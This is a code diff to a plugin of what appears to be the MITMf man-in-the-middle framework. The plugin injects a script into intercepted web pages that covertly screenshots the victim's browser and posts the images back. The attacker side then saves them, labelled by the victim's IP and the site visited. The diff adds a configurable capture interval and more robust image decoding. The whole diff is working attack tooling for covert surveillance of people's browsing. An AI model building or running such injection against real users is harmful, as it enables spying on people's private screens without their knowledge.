@@ -20,6 +20,8 @@
 
 import logging
 import base64
+import urllib
+import re
 
 from datetime import datetime
 from plugins.Inject import Inject
@@ -32,22 +34,30 @@ class ScreenShotter(Inject, Plugin):
 	optname  = 'screen'
 	desc     = 'Uses HTML5 Canvas to render an accurate screenshot of a clients browser'
 	ver      = '0.1'
-	has_opts = False
+	has_opts = True
 
 	def initialize(self, options):
+		self.interval = options.interval
 		Inject.initialize(self, options)
 		self.html_payload = self.get_payload()
 
 	def clientRequest(self, request):
 		if 'saveshot' in request.uri:
 			request.printPostData = False
-			img_file = './logs/{}-{}-{}.png'.format(request.client.getClientIP(), request.headers['host'], datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
-			with open(img_file, 'wb') as img:
-				img.write(base64.b64decode(request.postData[30:] + '=='))
-				img.close()
+			client = request.client.getClientIP()
+			img_file = '{}-{}-{}.png'.format(client, request.headers['host'], datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
+			try:
+				with open('./logs/' + img_file, 'wb') as img:
+					img.write(base64.b64decode(urllib.unquote(request.postData).decode('utf8').split(',')[1]))
+					img.close()
 
-			mitmf_logger.info('{} [ScreenShotter] Saved screenshot to {}'.format(request.client.getClientIP(), img_file))
+				mitmf_logger.info('{} [ScreenShotter] Saved screenshot to {}'.format(client, img_file))
+			except Exception as e:
+				mitmf_logger.error('{} [ScreenShotter] Error saving screenshot: {}'.format(client, e))
 
 	def get_payload(self):
-		canvas = open("./core/javascript/screenshot.js", "rb").read()
+		canvas = re.sub("SECONDS_GO_HERE", str(self.interval*1000), open("./core/javascript/screenshot.js", "rb").read())
 		return '<script type="text/javascript">' + canvas + '</script>'
+
+	def pluginOptions(self, options):
+		options.add_argument("--interval", dest="interval", type=int, metavar="SECONDS", default=10, help="Interval at which screenshots will be taken (default 10 seconds)")
